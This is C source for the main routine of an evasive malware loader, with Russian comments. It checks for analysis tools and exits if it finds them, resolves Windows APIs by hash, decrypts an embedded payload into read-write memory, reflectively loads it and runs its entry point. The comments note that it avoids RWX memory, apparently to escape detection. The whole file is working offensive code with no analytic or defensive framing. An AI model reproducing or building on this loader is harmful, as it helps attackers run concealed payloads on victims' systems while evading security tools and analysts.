// src/loader/main.c
// Финальный loader: RW → RX (без RWX) + anti-analysis.

#include "../common/types.h"
#include "../common/memory.h"
#include "../common/hashes.h"
#include "pe_parser.h"
#include "api_resolver.h"
#include "reflective.h"
#include "decrypt.h"
#include "../antianalysis/antianalysis.h"

typedef void  (__stdcall *pExitProcess)(u32);
typedef void* (__stdcall *pVirtualAlloc)(void*, u64, u32, u32);

extern const unsigned char  g_encrypted_payload[];
extern const unsigned int   g_encrypted_payload_size;
extern const unsigned char  g_payload_key[];
extern const unsigned int   g_payload_key_size;
extern const char           g_payload_algorithm[];

void loader_entry(void) {
    // 1. Anti-Analysis
    if (anti_analysis_check()) {
        pExitProcess pEP = (pExitProcess)resolve_kernel32(H_ExitProcess);
        if (pEP) pEP(0);
        return;
    }

    // 2. Память под расшифрованный payload — RW, НЕ RWX
    pVirtualAlloc pVA = (pVirtualAlloc)resolve_kernel32(H_VirtualAlloc);
    if (!pVA) {
        pExitProcess pEP = (pExitProcess)resolve_kernel32(H_ExitProcess);
        if (pEP) pEP(1);
        return;
    }

    u32 alloc_size = g_encrypted_payload_size + 0x1000;
    u8* payload = (u8*)pVA(NULL_, alloc_size,
                           MEM_COMMIT_ | MEM_RESERVE_,
                           PAGE_READWRITE_);   // ← RW, не RWX
    if (!payload) {
        pExitProcess pEP = (pExitProcess)resolve_kernel32(H_ExitProcess);
        if (pEP) pEP(2);
        return;
    }

    // 3. Расшифровка в RW-память
        if (!decrypt_payload(payload, alloc_size,
                         g_encrypted_payload, g_encrypted_payload_size,
                         g_payload_key, g_payload_key_size,
                         NULL_, 0,
                         g_payload_algorithm)) { 
        pExitProcess pEP = (pExitProcess)resolve_kernel32(H_ExitProcess);
        if (pEP) pEP(3);
        return;
    }

    // 4. Reflective load — сам выставит права по секциям
    void* image_base = NULL_;
    void* entry = reflective_load(payload, g_encrypted_payload_size,
                                  0, &image_base);
    if (!entry) {
        pExitProcess pEP = (pExitProcess)resolve_kernel32(H_ExitProcess);
        if (pEP) pEP(4);
        return;
    }

    // 5. Entry point payload'а
    typedef void (__stdcall *pEntry)(void);
    pEntry payload_main = (pEntry)entry;
    payload_main();

    pExitProcess pEP = (pExitProcess)resolve_kernel32(H_ExitProcess);
    if (pEP) pEP(0);
}